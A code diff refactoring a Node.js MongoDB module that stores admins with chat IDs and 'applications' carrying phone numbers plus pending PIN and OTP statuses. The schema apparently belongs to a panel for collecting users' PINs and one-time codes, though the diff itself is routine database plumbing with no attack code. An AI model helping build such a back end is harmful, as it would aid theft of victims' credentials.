@@ -13,6 +13,19 @@ const COLLECTIONS = {
 };
 
 /**
+ * Ensures DB connection is active before executing queries
+ */
+async function ensureDb() {
+    if (!db) {
+        await connectDatabase();
+    }
+    if (!db) {
+        throw new Error('Database is not initialized or connected.');
+    }
+    return db;
+}
+
+/**
  * Connect to MongoDB with connection pooling safety
  */
 async function connectDatabase() {
@@ -30,7 +43,8 @@ async function connectDatabase() {
         client = new MongoClient(MONGODB_URI, {
             maxPoolSize: 10,
             minPoolSize: 2,
-            serverSelectionTimeoutMS: 5000
+            serverSelectionTimeoutMS: 5000,
+            connectTimeoutMS: 10000
         });
 
         await client.connect();
@@ -53,7 +67,8 @@ async function connectDatabase() {
  */
 async function seedSuperAdmin() {
     try {
-        const superAdminExists = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId: 'ADMIN001' });
+        const database = await ensureDb();
+        const superAdminExists = await database.collection(COLLECTIONS.ADMINS).findOne({ adminId: 'ADMIN001' });
         if (!superAdminExists) {
             const superAdminDocument = {
                 adminId: 'ADMIN001',
@@ -63,7 +78,7 @@ async function seedSuperAdmin() {
                 status: 'active',
                 createdAt: new Date().toISOString()
             };
-            await db.collection(COLLECTIONS.ADMINS).insertOne(superAdminDocument);
+            await database.collection(COLLECTIONS.ADMINS).insertOne(superAdminDocument);
             console.log('⭐ Seeded default Super Admin (ADMIN001)');
         }
     } catch (error) {
@@ -72,26 +87,27 @@ async function seedSuperAdmin() {
 }
 
 /**
- * Create database indexes in parallel
+ * Create database indexes safely
  */
 async function createIndexes() {
     try {
+        const database = await ensureDb();
         await Promise.all([
-            db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true }),
-            db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 }),
-            db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 }),
-            db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 }),
+            database.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true }),
+            database.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 }, { sparse: true }),
+            database.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 }, { sparse: true }),
+            database.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 }),
 
-            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true }),
-            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 }),
-            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 }),
-            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 }),
-            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 }),
-            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 }),
+            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true }),
+            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 }),
+            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 }),
+            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 }),
+            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 }),
+            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 }),
 
-            db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 }),
-            db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 }),
-            db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 })
+            database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 }),
+            database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 }),
+            database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 })
         ]);
 
         console.log('✅ Database indexes verified');
@@ -118,14 +134,14 @@ async function closeDatabase() {
 
 async function logAdminActivity(adminId, action, details = {}) {
     try {
-        if (!db) return;
+        const database = await ensureDb();
         const logEntry = {
             adminId,
             action,
             details,
             timestamp: new Date().toISOString()
         };
-        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
+        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
     } catch (error) {
         console.error('❌ Error recording environment log:', error.message);
     }
@@ -133,7 +149,8 @@ async function logAdminActivity(adminId, action, details = {}) {
 
 async function getEnvironmentLogs(query = {}, limit = 100) {
     try {
-        return await db.collection(COLLECTIONS.ENVIRONMENT_LOGS)
+        const database = await ensureDb();
+        return await database.collection(COLLECTIONS.ENVIRONMENT_LOGS)
             .find(query)
             .sort({ timestamp: -1 })
             .limit(limit)
@@ -150,12 +167,15 @@ async function getEnvironmentLogs(query = {}, limit = 100) {
 
 async function saveAdmin(adminData) {
     try {
+        const database = await ensureDb();
         const adminId = adminData.adminId || adminData.id;
 
         if (!adminId)         throw new Error('Admin ID is required');
         if (!adminData.name)  throw new Error('Admin name is required');
 
-        const normalizedChatId = adminData.chatId ? String(adminData.chatId).trim() : null;
+        const normalizedChatId = adminData.chatId !== undefined && adminData.chatId !== null 
+            ? (typeof adminData.chatId === 'number' ? adminData.chatId : String(adminData.chatId).trim()) 
+            : null;
 
         const adminDocument = {
             adminId,
@@ -166,13 +186,11 @@ async function saveAdmin(adminData) {
             updatedAt: new Date().toISOString()
         };
 
-        if (adminData.createdAt) adminDocument.createdAt = adminData.createdAt;
-
-        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
+        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
             { adminId },
             { 
                 $set: adminDocument,
-                $setOnInsert: { createdAt: adminData.createdAt || new Date().toISOString() } 
+                $setOnInsert: { createdAt: adminData.createdAt ? new Date(adminData.createdAt).toISOString() : new Date().toISOString() } 
             },
             { upsert: true }
         );
@@ -189,7 +207,8 @@ async function saveAdmin(adminData) {
 
 async function getAdmin(adminId) {
     try {
-        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
+        const database = await ensureDb();
+        return await database.collection(COLLECTIONS.ADMINS).findOne({ adminId });
     } catch (error) {
         console.error('❌ Error getting admin:', error);
         return null;
@@ -198,11 +217,12 @@ async function getAdmin(adminId) {
 
 async function getAdminByChatId(chatId) {
     if (!chatId) return null;
-    const strChatId = String(chatId).trim();
-    const numChatId = Number(strChatId);
-
     try {
-        return await db.collection(COLLECTIONS.ADMINS).findOne({
+        const database = await ensureDb();
+        const strChatId = String(chatId).trim();
+        const numChatId = Number(strChatId);
+
+        return await database.collection(COLLECTIONS.ADMINS).findOne({
             $or: [
                 { chatId: strChatId },
                 { chatId: isNaN(numChatId) ? strChatId : numChatId }
@@ -216,7 +236,8 @@ async function getAdminByChatId(chatId) {
 
 async function getAllAdmins() {
     try {
-        return await db.collection(COLLECTIONS.ADMINS)
+        const database = await ensureDb();
+        return await database.collection(COLLECTIONS.ADMINS)
             .find({})
             .sort({ createdAt: 1 })
             .toArray();
@@ -228,7 +249,8 @@ async function getAllAdmins() {
 
 async function getActiveAdmins() {
     try {
-        return await db.collection(COLLECTIONS.ADMINS)
+        const database = await ensureDb();
+        return await database.collection(COLLECTIONS.ADMINS)
             .find({ status: 'active' })
             .toArray();
     } catch (error) {
@@ -239,12 +261,13 @@ async function getActiveAdmins() {
 
 async function updateAdmin(adminId, updates) {
     try {
+        const database = await ensureDb();
         const payload = { ...updates, updatedAt: new Date().toISOString() };
         if (payload.chatId !== undefined && payload.chatId !== null) {
-            payload.chatId = String(payload.chatId).trim();
+            payload.chatId = typeof payload.chatId === 'number' ? payload.chatId : String(payload.chatId).trim();
         }
 
-        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
+        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
             { adminId },
             { $set: payload }
         );
@@ -261,7 +284,8 @@ async function updateAdmin(adminId, updates) {
 
 async function updateAdminStatus(adminId, status) {
     try {
-        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
+        const database = await ensureDb();
+        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
             { adminId },
             { $set: { status, updatedAt: new Date().toISOString() } }
         );
@@ -278,7 +302,8 @@ async function updateAdminStatus(adminId, status) {
 
 async function deleteAdmin(adminId) {
     try {
-        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
+        const database = await ensureDb();
+        const result = await database.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
         
         await logAdminActivity(adminId, 'ADMIN_DELETED', {});
 
@@ -292,7 +317,8 @@ async function deleteAdmin(adminId) {
 
 async function adminExists(adminId) {
     try {
-        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
+        const database = await ensureDb();
+        const count = await database.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
         return count > 0;
     } catch (error) {
         console.error('❌ Error checking admin existence:', error);
@@ -302,7 +328,8 @@ async function adminExists(adminId) {
 
 async function getAdminCount() {
     try {
-        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
+        const database = await ensureDb();
+        return await database.collection(COLLECTIONS.ADMINS).countDocuments({});
     } catch (error) {
         console.error('❌ Error getting admin count:', error);
         return 0;
@@ -315,6 +342,7 @@ async function getAdminCount() {
 
 async function saveApplication(appData) {
     try {
+        const database = await ensureDb();
         const document = {
             id:              appData.id,
             adminId:         appData.adminId,
@@ -330,7 +358,7 @@ async function saveApplication(appData) {
             timestamp:       appData.timestamp || new Date().toISOString()
         };
 
-        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne(document);
+        const result = await database.collection(COLLECTIONS.APPLICATIONS).insertOne(document);
 
         if (appData.adminId) {
             await logAdminActivity(appData.adminId, 'APPLICATION_CREATED', { applicationId: appData.id, phoneNumber: appData.phoneNumber });
@@ -346,7 +374,8 @@ async function saveApplication(appData) {
 
 async function getApplication(applicationId) {
     try {
-        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
+        const database = await ensureDb();
+        return await database.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
     } catch (error) {
         console.error('❌ Error getting application:', error);
         return null;
@@ -355,7 +384,8 @@ async function getApplication(applicationId) {
 
 async function updateApplication(applicationId, updates) {
     try {
-        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
+        const database = await ensureDb();
+        const result = await database.collection(COLLECTIONS.APPLICATIONS).updateOne(
             { id: applicationId },
             { $set: { ...updates, updatedAt: new Date().toISOString() } }
         );
@@ -375,7 +405,8 @@ async function updateApplication(applicationId, updates) {
 
 async function getApplicationsByAdmin(adminId) {
     try {
-        return await db.collection(COLLECTIONS.APPLICATIONS)
+        const database = await ensureDb();
+        return await database.collection(COLLECTIONS.APPLICATIONS)
             .find({ adminId })
             .sort({ timestamp: -1 })
             .toArray();
@@ -387,7 +418,8 @@ async function getApplicationsByAdmin(adminId) {
 
 async function getPendingApplications(adminId) {
     try {
-        return await db.collection(COLLECTIONS.APPLICATIONS)
+        const database = await ensureDb();
+        return await database.collection(COLLECTIONS.APPLICATIONS)
             .find({
                 adminId,
                 $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
@@ -406,7 +438,8 @@ async function getPendingApplications(adminId) {
 
 async function getAdminStats(adminId) {
     try {
-        const stats = await db.collection(COLLECTIONS.APPLICATIONS).aggregate([
+        const database = await ensureDb();
+        const stats = await database.collection(COLLECTIONS.APPLICATIONS).aggregate([
             { $match: { adminId } },
             {
                 $group: {
@@ -442,9 +475,10 @@ async function getAdminStats(adminId) {
 
 async function getStats() {
     try {
+        const database = await ensureDb();
         const [totalAdmins, appStats] = await Promise.all([
-            db.collection(COLLECTIONS.ADMINS).countDocuments({}),
-            db.collection(COLLECTIONS.APPLICATIONS).aggregate([
+            database.collection(COLLECTIONS.ADMINS).countDocuments({}),
+            database.collection(COLLECTIONS.APPLICATIONS).aggregate([
                 {
                     $group: {
                         _id: null,
@@ -509,7 +543,8 @@ async function getPerAdminStats() {
 
 async function getAllAdminsDetailed() {
     try {
-        const admins = await db.collection(COLLECTIONS.ADMINS)
+        const database = await ensureDb();
+        const admins = await database.collection(COLLECTIONS.ADMINS)
             .find({})
             .sort({ createdAt: -1 })
             .toArray();
@@ -526,7 +561,8 @@ async function getAllAdminsDetailed() {
 
 async function cleanupInvalidAdmins() {
     try {
-        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
+        const database = await ensureDb();
+        const result = await database.collection(COLLECTIONS.ADMINS).deleteMany({
             $or: [
                 { adminId: { $exists: false } },
                 { adminId: null },
